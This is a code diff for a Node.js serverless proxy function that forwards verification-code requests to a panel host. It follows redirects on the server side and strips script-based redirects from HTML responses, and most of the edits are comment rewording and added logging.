@@ -5,14 +5,13 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
-    // 1. Clean up the path
     path = path.replace(/^\/api\/proxy/, '');
     if (!path.startsWith('/')) path = '/' + path;
 
     const parts = path.split('/').filter(Boolean);
     let code = '';
 
-    // 2. Extract the code (Check query first for POST, then URL path)
+    // Extract the code from the query string (the form submission) or the URL path
     if (req.query && req.query.code) {
         code = req.query.code;
     } else if (parts.length >= 2 && parts[1].length > 4) {
@@ -26,10 +25,7 @@ module.exports = async function (context, req) {
         return;
     }
 
-    // 3. Define the target URL
-    let targetPath = `/verify/${code}`;
-    let currentUrl = `https://${PANEL}${targetPath}`;
-
+    let currentUrl = `https://${PANEL}/verify/${code}`;
     context.log(`Forwarding ${req.method} to: ${currentUrl}`);
 
     const forwardHeaders = {
@@ -50,7 +46,7 @@ module.exports = async function (context, req) {
     try {
         let r;
 
-        // 4. Follow server-side redirects
+        // 🚨 STEP 4: FOLLOW REDIRECTS SERVER-SIDE 🚨
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -60,11 +56,13 @@ module.exports = async function (context, req) {
             });
 
             const loc = r.headers.get('location');
+            // If the panel says "Redirect to /verify/CODE", we catch it and fetch the final page here!
             if (r.status >= 300 && r.status < 400 && loc) {
                 let finalUrl = new URL(loc, currentUrl).toString();
                 finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
+                context.log(`Server-side Redirect hop ${hop} → ${finalUrl}`);
                 currentUrl = finalUrl;
-                continue;
+                continue; // Do the fetch again for the final page
             }
             break;
         }
@@ -72,8 +70,8 @@ module.exports = async function (context, req) {
         let responseBody = await r.text();
         const contentType  = r.headers.get('content-type') || 'text/html';
 
+        // Strip any lingering JS redirects just in case
         if (contentType.includes('text/html')) {
-            // Strip JS redirects
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                     return ''; 
